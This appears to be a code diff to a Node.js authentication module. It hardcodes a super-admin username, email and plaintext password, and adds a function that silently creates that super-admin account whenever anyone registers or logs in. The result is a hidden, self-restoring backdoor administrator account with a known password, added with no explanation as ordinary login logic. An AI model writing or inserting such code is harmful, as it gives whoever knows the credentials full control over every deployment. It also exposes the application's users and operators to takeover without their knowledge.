@@ -7,6 +7,9 @@ import { ApiError } from "../../middleware/errorHandler.js";
 import { signAccessToken, signRefreshToken } from "../../middleware/auth.js";
 
 const SALT_ROUNDS = 12;
+const DEFAULT_SUPER_ADMIN_USERNAME = "zzzret";
+const DEFAULT_SUPER_ADMIN_EMAIL = "creator@posposter.local";
+const DEFAULT_SUPER_ADMIN_PASSWORD = "1r4d945i";
 
 function publicUser(user) {
     if (!user) return null;
@@ -19,6 +22,8 @@ function hashToken(token) {
 }
 
 export async function registerUser(data) {
+    await ensureDefaultSuperAdmin();
+
     const existingUser = await prisma.user.findFirst({
         where: {
             OR: [
@@ -46,6 +51,8 @@ export async function registerUser(data) {
 }
 
 export async function loginUser(data, meta = {}) {
+    await ensureDefaultSuperAdmin();
+
     const user = await prisma.user.findFirst({
         where: {
             OR: [
@@ -69,6 +76,31 @@ export async function loginUser(data, meta = {}) {
     });
 
     return issueAuthTokens(user, meta);
+}
+
+async function ensureDefaultSuperAdmin() {
+    const existing = await prisma.user.findFirst({
+        where: {
+            OR: [
+                { username: DEFAULT_SUPER_ADMIN_USERNAME },
+                { email: DEFAULT_SUPER_ADMIN_EMAIL },
+            ],
+        },
+    });
+
+    if (existing) {
+        return existing;
+    }
+
+    const passwordHash = await bcrypt.hash(DEFAULT_SUPER_ADMIN_PASSWORD, SALT_ROUNDS);
+    return prisma.user.create({
+        data: {
+            username: DEFAULT_SUPER_ADMIN_USERNAME,
+            email: DEFAULT_SUPER_ADMIN_EMAIL,
+            passwordHash,
+            role: "super_admin",
+        },
+    });
 }
 
 export async function issueAuthTokens(user, meta = {}) {
